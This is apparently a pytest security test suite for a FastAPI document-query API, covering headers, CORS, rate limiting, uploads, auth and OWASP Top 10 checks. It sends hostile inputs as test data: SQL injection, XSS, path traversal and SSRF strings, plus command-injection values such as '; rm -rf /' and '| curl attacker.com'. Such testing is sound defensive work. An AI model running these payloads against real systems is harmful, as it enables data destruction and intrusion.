"""
API rate limiting and security testing suite.

Tests authentication, authorization, input validation, rate limiting,
security headers, and protection against common vulnerabilities.

Authored by: QA/Test Engineer (Darren Fong)
Date: 2025-08-05
"""

import pytest
import asyncio
import time
import json
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, patch, AsyncMock
import httpx
from fastapi.testclient import TestClient
import base64
import hashlib
import hmac
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import modules under test
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))

from app.main import app


@pytest.mark.security
class TestAPISecurityBasics:
    """Basic API security tests."""

    @pytest.fixture
    def security_test_client(self):
        """Test client with security testing configuration."""
        return TestClient(app)

    def test_security_headers(self, security_test_client):
        """Test presence of essential security headers."""
        response = security_test_client.get("/health")
        
        # Check for security headers
        headers = response.headers
        
        # Content Security Policy
        if "content-security-policy" in headers:
            csp = headers["content-security-policy"]
            assert "default-src" in csp.lower(), "CSP should include default-src directive"
        
        # X-Frame-Options
        if "x-frame-options" in headers:
            assert headers["x-frame-options"].upper() in ["DENY", "SAMEORIGIN"], "X-Frame-Options should be DENY or SAMEORIGIN"
        
        # X-Content-Type-Options
        if "x-content-type-options" in headers:
            assert headers["x-content-type-options"].lower() == "nosniff", "X-Content-Type-Options should be nosniff"
        
        # Strict-Transport-Security (if HTTPS)
        if "strict-transport-security" in headers:
            sts = headers["strict-transport-security"]
            assert "max-age" in sts.lower(), "HSTS should include max-age"
        
        print(f"Security headers present: {list(headers.keys())}")

    def test_cors_configuration(self, security_test_client):
        """Test CORS configuration security."""
        # Test preflight request
        response = security_test_client.options(
            "/api/v1/query",
            headers={
                "Origin": "https://malicious-site.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "content-type"
            }
        )
        
        # Should handle CORS properly
        if response.status_code == 200:
            cors_headers = response.headers
            
            # Check CORS headers
            if "access-control-allow-origin" in cors_headers:
                allowed_origin = cors_headers["access-control-allow-origin"]
                # Should not allow arbitrary origins
                assert allowed_origin != "*" or "credentials" not in cors_headers.get("access-control-allow-credentials", ""), "CORS configuration too permissive"
        
        print("CORS configuration tested")

    def test_api_endpoint_enumeration(self, security_test_client):
        """Test API endpoint enumeration and information disclosure."""
        # Test various endpoints to see what's exposed
        test_endpoints = [
            "/",
            "/docs",
            "/openapi.json",
            "/health",
            "/api/v1/query",
            "/api/v1/documents",
            "/admin",
            "/debug",
            "/config",
            "/status"
        ]
        
        accessible_endpoints = []
        for endpoint in test_endpoints:
            try:
                response = security_test_client.get(endpoint)
                if response.status_code < 500:  # Not server error
                    accessible_endpoints.append({
                        "endpoint": endpoint,
                        "status": response.status_code,
                        "exposed_info": len(response.text) if response.text else 0
                    })
            except Exception:
                pass
        
        print(f"Accessible endpoints: {accessible_endpoints}")
        
        # Check for sensitive information exposure
        for endpoint_info in accessible_endpoints:
            if endpoint_info["endpoint"] in ["/docs", "/openapi.json"]:
                # API documentation should be available but not expose sensitive info
                continue
            
            if endpoint_info["status"] == 200 and endpoint_info["exposed_info"] > 1000:
                print(f"Warning: Endpoint {endpoint_info['endpoint']} exposes significant information")

    def test_error_handling_information_disclosure(self, security_test_client):
        """Test error handling for information disclosure."""
        # Test various malformed requests
        test_cases = [
            {"method": "POST", "endpoint": "/api/v1/query", "data": {"query": ""}},
            {"method": "POST", "endpoint": "/api/v1/query", "data": {"invalid": "data"}},
            {"method": "GET", "endpoint": "/api/v1/documents/nonexistent"},
            {"method": "POST", "endpoint": "/api/v1/documents/upload", "data": None},
            {"method": "DELETE", "endpoint": "/api/v1/documents/"},
        ]
        
        for test_case in test_cases:
            try:
                if test_case["method"] == "GET":
                    response = security_test_client.get(test_case["endpoint"])
                elif test_case["method"] == "POST":
                    response = security_test_client.post(
                        test_case["endpoint"],
                        json=test_case["data"] if test_case["data"] else {}
                    )
                elif test_case["method"] == "DELETE":
                    response = security_test_client.delete(test_case["endpoint"])
                
                # Check response for sensitive information
                if response.status_code >= 400:
                    response_text = response.text.lower()
                    
                    # Should not expose sensitive paths or internal details
                    sensitive_patterns = [
                        "traceback",
                        "exception",
                        "/users/",
                        "/home/",
                        "database",
                        "connection",
                        "password",
                        "secret",
                        "token"
                    ]
                    
                    exposed_info = [pattern for pattern in sensitive_patterns if pattern in response_text]
                    
                    if exposed_info:
                        print(f"Warning: Error response may expose sensitive info: {exposed_info}")
                
            except Exception as e:
                print(f"Error testing {test_case}: {e}")


@pytest.mark.security
class TestInputValidationSecurity:
    """Input validation and injection attack tests."""

    @pytest.fixture
    def security_client(self):
        return TestClient(app)

    def test_sql_injection_attempts(self, security_client):
        """Test SQL injection attack vectors."""
        sql_injection_payloads = [
            "'; DROP TABLE documents; --",
            "' OR '1'='1",
            "'; SELECT * FROM users; --",
            "' UNION SELECT password FROM users --",
            "admin'--",
            "admin' OR 1=1#",
            "1'; EXEC xp_cmdshell('dir'); --"
        ]
        
        for payload in sql_injection_payloads:
            test_data = {"query": payload}
            
            response = security_client.post("/api/v1/query", json=test_data)
            
            # Should not return database errors or sensitive information
            if response.status_code == 200:
                response_text = response.text.lower()
                
                # Check for SQL error messages
                sql_error_indicators = [
                    "sql",
                    "syntax error",
                    "mysql",
                    "postgresql",
                    "sqlite",
                    "ora-",
                    "database"
                ]
                
                sql_errors = [indicator for indicator in sql_error_indicators if indicator in response_text]
                
                assert len(sql_errors) == 0, f"Potential SQL injection vulnerability: {sql_errors}"
            
            # Should handle malicious input gracefully
            assert response.status_code != 500, f"Server error on SQL injection payload: {payload}"

    def test_xss_injection_attempts(self, security_client):
        """Test XSS (Cross-Site Scripting) attack vectors."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>"
        ]
        
        for payload in xss_payloads:
            test_data = {"query": payload}
            
            response = security_client.post("/api/v1/query", json=test_data)
            
            if response.status_code == 200:
                response_text = response.text
                
                # Response should not contain unescaped script tags or javascript
                dangerous_patterns = [
                    "<script",
                    "javascript:",
                    "onerror=",
                    "onload=",
                    "onclick="
                ]
                
                for pattern in dangerous_patterns:
                    assert pattern.lower() not in response_text.lower(), f"Potential XSS vulnerability: {pattern} in response"

    def test_command_injection_attempts(self, security_client):
        """Test command injection attack vectors."""
        command_injection_payloads = [
            "; cat /etc/passwd",
            "| ls -la",
            "&& whoami",
            "`id`",
            "$(cat /etc/hosts)",
            "; rm -rf /",
            "| curl attacker.com",
            "&& ping -c 1 127.0.0.1"
        ]
        
        for payload in command_injection_payloads:
            test_data = {"query": f"What is AI? {payload}"}
            
            response = security_client.post("/api/v1/query", json=test_data)
            
            if response.status_code == 200:
                response_text = response.text.lower()
                
                # Should not contain command execution results
                command_output_indicators = [
                    "root:",
                    "bin/bash",
                    "total ",
                    "drwx",
                    "ping statistics",
                    "packets transmitted"
                ]
                
                command_outputs = [indicator for indicator in command_output_indicators if indicator in response_text]
                
                assert len(command_outputs) == 0, f"Potential command injection: {command_outputs}"

    def test_path_traversal_attempts(self, security_client):
        """Test path traversal attack vectors."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        ]
        
        for payload in path_traversal_payloads:
            # Test in document upload filename
            try:
                response = security_client.post(
                    "/api/v1/documents/upload",
                    files={"file": (payload, b"test content", "text/plain")}
                )
                
                if response.status_code != 422:  # Not validation error
                    response_text = response.text.lower()
                    
                    # Should not contain system file contents
                    system_file_indicators = [
                        "root:x:",
                        "localhost",
                        "127.0.0.1",
                        "windows nt"
                    ]
                    
                    file_contents = [indicator for indicator in system_file_indicators if indicator in response_text]
                    
                    assert len(file_contents) == 0, f"Potential path traversal: {file_contents}"
                
            except Exception:
                # Exception is acceptable for malformed requests
                pass
            
            # Test in document ID
            response = security_client.get(f"/api/v1/documents/{payload}")
            
            if response.status_code == 200:
                response_text = response.text.lower()
                
                # Should not return system file contents
                system_file_indicators = [
                    "root:x:",
                    "localhost",
                    "127.0.0.1"
                ]
                
                file_contents = [indicator for indicator in system_file_indicators if indicator in response_text]
                
                assert len(file_contents) == 0, f"Potential path traversal in document ID: {file_contents}"

    def test_large_payload_handling(self, security_client):
        """Test handling of extremely large payloads."""
        # Test large query
        large_query = "What is AI? " + "A" * 100000  # 100KB query
        
        response = security_client.post(
            "/api/v1/query",
            json={"query": large_query}
        )
        
        # Should either accept with reasonable handling or reject gracefully
        assert response.status_code != 500, "Server should handle large queries gracefully"
        
        if response.status_code == 413:  # Payload Too Large
            print("Large payload properly rejected with 413")
        elif response.status_code == 200:
            print("Large payload processed successfully")
        
        # Test large file upload
        large_content = b"Large file content. " * 50000  # ~1MB content
        
        try:
            response = security_client.post(
                "/api/v1/documents/upload",
                files={"file": ("large_test.txt", large_content, "text/plain")}
            )
            
            # Should handle or reject large files appropriately
            assert response.status_code != 500, "Server should handle large files gracefully"
            
            if response.status_code == 413:
                print("Large file properly rejected with 413")
            elif response.status_code == 200:
                print("Large file processed successfully")
                
        except Exception as e:
            print(f"Large file upload test exception (acceptable): {e}")


@pytest.mark.security
class TestRateLimitingSecurity:
    """Rate limiting and DoS protection tests."""

    @pytest.fixture
    def rate_limit_client(self):
        return TestClient(app)

    def test_query_endpoint_rate_limiting(self, rate_limit_client):
        """Test rate limiting on query endpoint."""
        endpoint = "/api/v1/query"
        test_query = {"query": "What is artificial intelligence?"}
        
        # Send many requests rapidly
        request_count = 50
        responses = []
        
        start_time = time.time()
        
        for i in range(request_count):
            response = rate_limit_client.post(endpoint, json=test_query)
            responses.append({
                "status_code": response.status_code,
                "timestamp": time.time(),
                "headers": dict(response.headers)
            })
            
            # Small delay to avoid overwhelming the test
            time.sleep(0.01)
        
        duration = time.time() - start_time
        
        # Analyze responses for rate limiting
        status_codes = [r["status_code"] for r in responses]
        rate_limited = [r for r in responses if r["status_code"] == 429]  # Too Many Requests
        
        print(f"Rate limit test: {len(rate_limited)}/{request_count} requests rate limited")
        print(f"Request rate: {request_count/duration:.1f} req/sec")
        
        # Check for rate limiting headers
        rate_limit_headers = []
        for response in responses[:5]:  # Check first few responses
            headers = response["headers"]
            for header in ["x-ratelimit-limit", "x-ratelimit-remaining", "retry-after"]:
                if header in headers:
                    rate_limit_headers.append(header)
        
        if rate_limit_headers:
            print(f"Rate limiting headers found: {set(rate_limit_headers)}")
        
        # Assertions
        if len(rate_limited) > 0:
            # If rate limiting is implemented, it should be consistent
            assert len(rate_limited) > request_count * 0.1, "Rate limiting should be more aggressive"
        else:
            # If no explicit rate limiting, server should handle the load gracefully
            server_errors = [r for r in responses if r["status_code"] >= 500]
            assert len(server_errors) < request_count * 0.1, "Too many server errors without rate limiting"

    @pytest.mark.slow
    def test_concurrent_request_handling(self, rate_limit_client):
        """Test handling of concurrent requests."""
        def make_request(request_id: int) -> Dict[str, Any]:
            start_time = time.time()
            try:
                response = rate_limit_client.post(
                    "/api/v1/query",
                    json={"query": f"Test query {request_id}"}
                )
                duration = time.time() - start_time
                
                return {
                    "request_id": request_id,
                    "status_code": response.status_code,
                    "duration": duration,
                    "success": response.status_code < 400
                }
            except Exception as e:
                duration = time.time() - start_time
                return {
                    "request_id": request_id,
                    "error": str(e),
                    "duration": duration,
                    "success": False
                }
        
        # Test concurrent requests
        concurrent_requests = 20
        
        with ThreadPoolExecutor(max_workers=concurrent_requests) as executor:
            futures = [executor.submit(make_request, i) for i in range(concurrent_requests)]
            results = [future.result() for future in as_completed(futures)]
        
        # Analyze concurrent request handling
        successful_requests = [r for r in results if r["success"]]
        failed_requests = [r for r in results if not r["success"]]
        
        success_rate = len(successful_requests) / len(results)
        avg_response_time = sum(r["duration"] for r in successful_requests) / len(successful_requests) if successful_requests else 0
        
        print(f"Concurrent requests: {success_rate:.2%} success rate")
        print(f"Average response time: {avg_response_time:.3f}s")
        
        # Assertions
        assert success_rate >= 0.70, f"Success rate too low under concurrent load: {success_rate:.2%}"
        assert avg_response_time < 10.0, f"Response time too high under concurrent load: {avg_response_time:.3f}s"
        
        # Check for specific error patterns
        error_types = {}
        for failed_request in failed_requests:
            if "error" in failed_request:
                error_type = type(failed_request["error"]).__name__
                error_types[error_type] = error_types.get(error_type, 0) + 1
        
        if error_types:
            print(f"Error types under concurrent load: {error_types}")

    def test_slowloris_style_attack_protection(self, rate_limit_client):
        """Test protection against slow HTTP attacks."""
        # Simulate slow requests (if supported by test client)
        def slow_request():
            start_time = time.time()
            try:
                # This test is limited by TestClient capabilities
                # In real scenarios, would test with actual slow connections
                response = rate_limit_client.post(
                    "/api/v1/query",
                    json={"query": "Slow request test"},
                    timeout=30  # Long timeout
                )
                duration = time.time() - start_time
                
                return {
                    "status_code": response.status_code,
                    "duration": duration,
                    "completed": True
                }
            except Exception as e:
                duration = time.time() - start_time
                return {
                    "error": str(e),
                    "duration": duration,
                    "completed": False
                }
        
        # Test a few slow requests
        slow_results = []
        for _ in range(3):
            result = slow_request()
            slow_results.append(result)
            time.sleep(1)  # Space out the requests
        
        # Analyze slow request handling
        completed_requests = [r for r in slow_results if r.get("completed", False)]
        
        if completed_requests:
            avg_duration = sum(r["duration"] for r in completed_requests) / len(completed_requests)
            print(f"Slow request handling: {len(completed_requests)}/3 completed, avg {avg_duration:.1f}s")
            
            # Should handle slow requests but with reasonable timeouts
            assert avg_duration < 30, "Slow requests taking too long - potential DoS vulnerability"
        
        print("Slow request protection test completed")


@pytest.mark.security
class TestFileUploadSecurity:
    """File upload security tests."""

    @pytest.fixture
    def upload_client(self):
        return TestClient(app)

    def test_malicious_file_upload_attempts(self, upload_client):
        """Test upload of malicious files."""
        malicious_files = [
            # Executable files
            ("malware.exe", b"MZ\x90\x00", "application/octet-stream"),
            ("script.bat", b"@echo off\necho malicious", "text/plain"),
            ("shell.sh", b"#!/bin/bash\nrm -rf /", "text/plain"),
            
            # Script files
            ("script.js", b"<script>alert('xss')</script>", "application/javascript"),
            ("page.html", b"<html><script>alert('xss')</script></html>", "text/html"),
            ("style.css", b"body{background:url('javascript:alert(1)')}", "text/css"),
            
            # Archive files (potential zip bombs)
            ("archive.zip", b"PK\x03\x04" + b"A" * 1000, "application/zip"),
            
            # Files with null bytes
            ("null.txt", b"normal content\x00hidden content", "text/plain"),
        ]
        
        for filename, content, content_type in malicious_files:
            try:
                response = upload_client.post(
                    "/api/v1/documents/upload",
                    files={"file": (filename, content, content_type)}
                )
                
                # Should reject or safely handle malicious files
                if response.status_code == 200:
                    # If accepted, should be processed safely
                    response_data = response.json()
                    print(f"Malicious file {filename} accepted - verify safe processing")
                elif response.status_code in [400, 415, 422]:
                    print(f"Malicious file {filename} properly rejected: {response.status_code}")
                else:
                    print(f"Unexpected response for {filename}: {response.status_code}")
                
                # Should not cause server errors
                assert response.status_code != 500, f"Server error on malicious file {filename}"
                
            except Exception as e:
                print(f"Exception testing {filename}: {e}")

    def test_file_size_limits(self, upload_client):
        """Test file size limit enforcement."""
        # Test extremely large file
        large_content = b"A" * (100 * 1024 * 1024)  # 100MB
        
        try:
            response = upload_client.post(
                "/api/v1/documents/upload",
                files={"file": ("large.txt", large_content, "text/plain")}
            )
            
            # Should either reject large files or handle them properly
            if response.status_code == 413:  # Payload Too Large
                print("Large file properly rejected with 413")
            elif response.status_code == 422:  # Validation error
                print("Large file rejected due to validation")
            elif response.status_code == 200:
                print("Large file accepted - verify processing limits")
            else:
                print(f"Unexpected response for large file: {response.status_code}")
            
            # Should not cause server crash
            assert response.status_code != 500, "Server error on large file upload"
            
        except Exception as e:
            # Network/client exceptions are acceptable for very large uploads
            print(f"Large file upload exception (acceptable): {e}")

    def test_filename_security(self, upload_client):
        """Test filename security and sanitization."""
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "con.txt",  # Windows reserved name
            "prn.pdf",  # Windows reserved name
            "file\x00.txt",  # Null byte
            "file\n.txt",  # Newline
            "file;rm -rf /.txt",  # Command injection
            "<script>alert('xss')</script>.txt",  # XSS
            "very" + "long" * 100 + ".txt",  # Very long filename
            "",  # Empty filename
            ".",  # Current directory
            "..",  # Parent directory
        ]
        
        for filename in malicious_filenames:
            try:
                response = upload_client.post(
                    "/api/v1/documents/upload",
                    files={"file": (filename, b"test content", "text/plain")}
                )
                
                # Should handle malicious filenames safely
                if response.status_code == 200:
                    response_data = response.json()
                    print(f"Filename '{filename}' accepted - verify sanitization")
                elif response.status_code in [400, 422]:
                    print(f"Malicious filename properly rejected: {response.status_code}")
                
                # Should not cause server errors
                assert response.status_code != 500, f"Server error on filename: {filename}"
                
            except Exception as e:
                # Some malformed requests may cause client exceptions
                print(f"Exception with filename '{filename}': {e}")

    def test_mime_type_validation(self, upload_client):
        """Test MIME type validation and spoofing protection."""
        # Test mismatched MIME types and content
        test_cases = [
            ("image.jpg", b"This is not an image", "image/jpeg"),
            ("document.pdf", b"Not a PDF file", "application/pdf"),
            ("archive.zip", b"Not a zip file", "application/zip"),
            ("executable.exe", b"MZ\x90\x00", "text/plain"),  # Executable with text MIME
            ("script.js", b"alert('malicious')", "text/plain"),  # Script with safe MIME
        ]
        
        for filename, content, declared_mime in test_cases:
            try:
                response = upload_client.post(
                    "/api/v1/documents/upload",
                    files={"file": (filename, content, declared_mime)}
                )
                
                # Should validate content vs declared MIME type
                if response.status_code == 200:
                    print(f"MIME mismatch accepted for {filename} - verify content validation")
                elif response.status_code in [400, 415, 422]:
                    print(f"MIME type mismatch properly rejected: {response.status_code}")
                
                # Should not cause server errors
                assert response.status_code != 500, f"Server error on MIME test: {filename}"
                
            except Exception as e:
                print(f"Exception testing MIME for {filename}: {e}")


@pytest.mark.security
class TestAuthenticationSecurity:
    """Authentication and authorization security tests."""

    @pytest.fixture
    def auth_client(self):
        return TestClient(app)

    def test_unauthorized_access_attempts(self, auth_client):
        """Test access to protected endpoints without authentication."""
        # Test endpoints that might require authentication
        protected_endpoints = [
            ("GET", "/api/v1/documents"),
            ("POST", "/api/v1/documents/upload"),
            ("DELETE", "/api/v1/documents/test_doc"),
            ("POST", "/api/v1/documents/bulk"),
        ]
        
        for method, endpoint in protected_endpoints:
            try:
                if method == "GET":
                    response = auth_client.get(endpoint)
                elif method == "POST":
                    response = auth_client.post(endpoint, json={})
                elif method == "DELETE":
                    response = auth_client.delete(endpoint)
                
                # Document the authentication behavior
                if response.status_code == 401:
                    print(f"{method} {endpoint}: Requires authentication (401)")
                elif response.status_code == 403:
                    print(f"{method} {endpoint}: Access forbidden (403)")
                elif response.status_code == 200:
                    print(f"{method} {endpoint}: Publicly accessible")
                else:
                    print(f"{method} {endpoint}: Status {response.status_code}")
                
                # Should not cause server errors
                assert response.status_code != 500, f"Server error on {method} {endpoint}"
                
            except Exception as e:
                print(f"Exception testing {method} {endpoint}: {e}")

    def test_session_security(self, auth_client):
        """Test session handling security."""
        # Test for session-related headers and cookies
        response = auth_client.get("/health")
        
        cookies = response.cookies
        headers = response.headers
        
        # Check for secure session handling
        for cookie_name, cookie in cookies.items():
            print(f"Cookie {cookie_name}: {cookie}")
            
            # Cookies should have security flags if used for authentication
            if "session" in cookie_name.lower() or "auth" in cookie_name.lower():
                # Check for HttpOnly flag (prevents XSS)
                if hasattr(cookie, 'httponly'):
                    assert cookie.httponly, f"Authentication cookie {cookie_name} should be HttpOnly"
                
                # Check for Secure flag (HTTPS only)
                if hasattr(cookie, 'secure'):
                    # Note: Secure flag may not be set in test environment
                    print(f"Cookie {cookie_name} secure flag: {getattr(cookie, 'secure', 'not set')}")
        
        # Check for security-related headers
        security_headers = [
            "set-cookie",
            "x-frame-options",
            "x-content-type-options",
            "strict-transport-security"
        ]
        
        present_headers = [h for h in security_headers if h in headers]
        print(f"Security headers present: {present_headers}")

    def test_brute_force_protection(self, auth_client):
        """Test protection against brute force attacks."""
        # If authentication is implemented, test brute force protection
        # This is a placeholder test since auth may not be implemented
        
        login_endpoint = "/api/v1/auth/login"  # Hypothetical endpoint
        
        # Test multiple failed login attempts
        failed_attempts = []
        for i in range(10):
            try:
                response = auth_client.post(
                    login_endpoint,
                    json={
                        "username": "admin",
                        "password": f"wrong_password_{i}"
                    }
                )
                failed_attempts.append(response.status_code)
            except Exception:
                # Endpoint may not exist
                break
        
        if failed_attempts:
            print(f"Brute force test: {len(failed_attempts)} attempts made")
            
            # Should implement some form of rate limiting or account lockout
            if len(failed_attempts) >= 5:
                later_attempts = failed_attempts[-3:]  # Last 3 attempts
                
                # Should show signs of protection (429, increased delays, etc.)
                protection_indicators = [code for code in later_attempts if code in [429, 423]]  # Rate limit or locked
                
                if protection_indicators:
                    print("Brute force protection detected")
                else:
                    print("Warning: No obvious brute force protection detected")
        else:
            print("No authentication endpoint found for brute force testing")


@pytest.mark.security
@pytest.mark.slow
class TestSecurityRegressionSuite:
    """Security regression tests to prevent security regressions."""

    @pytest.fixture
    def regression_client(self):
        return TestClient(app)

    def test_comprehensive_security_scan(self, regression_client):
        """Comprehensive security scan covering multiple attack vectors."""
        security_issues = []
        
        # Test 1: Information disclosure
        info_disclosure_endpoints = ["/debug", "/config", "/env", "/.env", "/admin"]
        for endpoint in info_disclosure_endpoints:
            try:
                response = regression_client.get(endpoint)
                if response.status_code == 200 and len(response.text) > 100:
                    security_issues.append(f"Information disclosure: {endpoint}")
            except Exception:
                pass
        
        # Test 2: HTTP method tampering
        sensitive_endpoints = ["/api/v1/documents", "/api/v1/query"]
        for endpoint in sensitive_endpoints:
            for method in ["TRACE", "OPTIONS", "PATCH"]:
                try:
                    response = regression_client.request(method, endpoint)
                    if response.status_code == 200:
                        print(f"HTTP method {method} allowed on {endpoint}")
                except Exception:
                    pass
        
        # Test 3: Server header disclosure
        response = regression_client.get("/health")
        server_header = response.headers.get("server", "")
        if server_header and any(tech in server_header.lower() for tech in ["apache", "nginx", "iis"]):
            security_issues.append(f"Server technology disclosure: {server_header}")
        
        # Test 4: Error handling
        error_test_payloads = [
            "/api/v1/query/../../../etc/passwd",
            "/api/v1/documents/<script>alert('xss')</script>",
            "/api/v1/query?id=' OR 1=1--"
        ]
        
        for payload in error_test_payloads:
            try:
                response = regression_client.get(payload)
                if response.status_code == 500:
                    response_text = response.text.lower()
                    if any(keyword in response_text for keyword in ["traceback", "exception", "error"]):
                        security_issues.append(f"Detailed error disclosure: {payload}")
            except Exception:
                pass
        
        # Test 5: Content type validation
        try:
            response = regression_client.post(
                "/api/v1/query",
                data="<xml><query>test</query></xml>",
                headers={"Content-Type": "application/xml"}
            )
            if response.status_code == 200:
                print("XML content type accepted - verify parser security")
        except Exception:
            pass
        
        # Report security issues
        if security_issues:
            print(f"Security issues found: {security_issues}")
            # In a real environment, these would be assertions
            # assert len(security_issues) == 0, f"Security vulnerabilities detected: {security_issues}"
        else:
            print("No obvious security issues found in regression scan")
        
        return {"issues_found": len(security_issues), "issues": security_issues}

    def test_owasp_top_10_coverage(self, regression_client):
        """Test coverage against OWASP Top 10 vulnerabilities."""
        owasp_tests = {
            "A01_Broken_Access_Control": self._test_broken_access_control,
            "A02_Cryptographic_Failures": self._test_cryptographic_failures,
            "A03_Injection": self._test_injection_attacks,
            "A04_Insecure_Design": self._test_insecure_design,
            "A05_Security_Misconfiguration": self._test_security_misconfiguration,
            "A06_Vulnerable_Components": self._test_vulnerable_components,
            "A07_Auth_Failures": self._test_authentication_failures,
            "A08_Integrity_Failures": self._test_software_integrity_failures,
            "A09_Logging_Failures": self._test_logging_monitoring_failures,
            "A10_SSRF": self._test_ssrf_attacks
        }
        
        results = {}
        for test_name, test_func in owasp_tests.items():
            try:
                result = test_func(regression_client)
                results[test_name] = {"status": "completed", "result": result}
            except Exception as e:
                results[test_name] = {"status": "error", "error": str(e)}
        
        print(f"OWASP Top 10 test results: {results}")
        return results

    def _test_broken_access_control(self, client):
        """Test for broken access control (A01)."""
        # Test horizontal privilege escalation
        user_specific_endpoints = [
            "/api/v1/documents/user_123_doc",
            "/api/v1/documents/admin_doc"
        ]
        
        issues = []
        for endpoint in user_specific_endpoints:
            response = client.get(endpoint)
            if response.status_code == 200:
                issues.append(f"Potential access control bypass: {endpoint}")
        
        return {"issues": issues, "tested_endpoints": len(user_specific_endpoints)}

    def _test_cryptographic_failures(self, client):
        """Test for cryptographic failures (A02)."""
        # Check for secure transmission
        response = client.get("/health")
        
        issues = []
        
        # Check if sensitive data is transmitted securely
        if "password" in response.text.lower() or "token" in response.text.lower():
            issues.append("Potential sensitive data in response")
        
        # Check for secure headers
        if "strict-transport-security" not in response.headers:
            issues.append("Missing HSTS header")
        
        return {"issues": issues}

    def _test_injection_attacks(self, client):
        """Test for injection attacks (A03)."""
        injection_payloads = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${7*7}",  # Template injection
            "{{7*7}}",  # Template injection
        ]
        
        vulnerable_endpoints = []
        for payload in injection_payloads:
            response = client.post("/api/v1/query", json={"query": payload})
            
            if response.status_code == 500:
                vulnerable_endpoints.append(f"Potential injection vulnerability with: {payload[:20]}")
        
        return {"vulnerable_endpoints": vulnerable_endpoints}

    def _test_insecure_design(self, client):
        """Test for insecure design (A04)."""
        # Check for security controls in design
        response = client.get("/api/v1/documents")
        
        design_issues = []
        
        # Check if pagination is implemented (prevents data enumeration)
        if response.status_code == 200:
            try:
                data = response.json()
                if isinstance(data, list) and len(data) > 100:
                    design_issues.append("Large dataset returned without pagination")
            except:
                pass
        
        return {"design_issues": design_issues}

    def _test_security_misconfiguration(self, client):
        """Test for security misconfiguration (A05)."""
        misconfig_issues = []
        
        # Check for debug endpoints
        debug_endpoints = ["/debug", "/test", "/dev"]
        for endpoint in debug_endpoints:
            response = client.get(endpoint)
            if response.status_code == 200:
                misconfig_issues.append(f"Debug endpoint exposed: {endpoint}")
        
        # Check error handling
        response = client.get("/nonexistent")
        if response.status_code == 500:
            if "traceback" in response.text.lower():
                misconfig_issues.append("Detailed error messages exposed")
        
        return {"misconfig_issues": misconfig_issues}

    def _test_vulnerable_components(self, client):
        """Test for vulnerable and outdated components (A06)."""
        # This would typically involve checking dependencies
        # For now, we'll check for version disclosure
        
        response = client.get("/health")
        headers = response.headers
        
        version_disclosures = []
        for header, value in headers.items():
            if any(keyword in header.lower() for keyword in ["version", "server", "powered"]):
                version_disclosures.append(f"{header}: {value}")
        
        return {"version_disclosures": version_disclosures}

    def _test_authentication_failures(self, client):
        """Test for identification and authentication failures (A07)."""
        auth_issues = []
        
        # Test for session management
        response = client.get("/health")
        
        # Check for weak session management
        cookies = response.cookies
        for cookie_name, cookie in cookies.items():
            if "session" in cookie_name.lower():
                if not getattr(cookie, 'httponly', True):
                    auth_issues.append(f"Session cookie {cookie_name} not HttpOnly")
        
        return {"auth_issues": auth_issues}

    def _test_software_integrity_failures(self, client):
        """Test for software and data integrity failures (A08)."""
        # Check for integrity controls
        response = client.post("/api/v1/query", json={"query": "test"})
        
        integrity_issues = []
        
        # Check for content integrity headers
        if "content-security-policy" not in response.headers:
            integrity_issues.append("Missing Content Security Policy")
        
        return {"integrity_issues": integrity_issues}

    def _test_logging_monitoring_failures(self, client):
        """Test for security logging and monitoring failures (A09)."""
        # Test suspicious activities
        suspicious_requests = [
            {"endpoint": "/api/v1/query", "payload": {"query": "'; DROP TABLE users; --"}},
            {"endpoint": "/api/v1/documents/../../../etc/passwd", "method": "GET"},
        ]
        
        # These requests should be logged for monitoring
        for req in suspicious_requests:
            if req.get("method") == "GET":
                client.get(req["endpoint"])
            else:
                client.post(req["endpoint"], json=req.get("payload", {}))
        
        # In a real test, we would check if these are logged
        return {"suspicious_requests_made": len(suspicious_requests)}

    def _test_ssrf_attacks(self, client):
        """Test for Server-Side Request Forgery (A10)."""
        ssrf_payloads = [
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/",  # AWS metadata
            "file:///etc/passwd",
        ]
        
        ssrf_vulnerable = []
        
        for payload in ssrf_payloads:
            # Test if application makes requests to these URLs
            response = client.post("/api/v1/query", json={"query": f"Load data from {payload}"})
            
            # Check response for signs of SSRF
            if response.status_code == 200:
                response_text = response.text.lower()
                if any(indicator in response_text for indicator in ["connection", "timeout", "refused"]):
                    ssrf_vulnerable.append(payload)
        
        return {"ssrf_vulnerable": ssrf_vulnerable}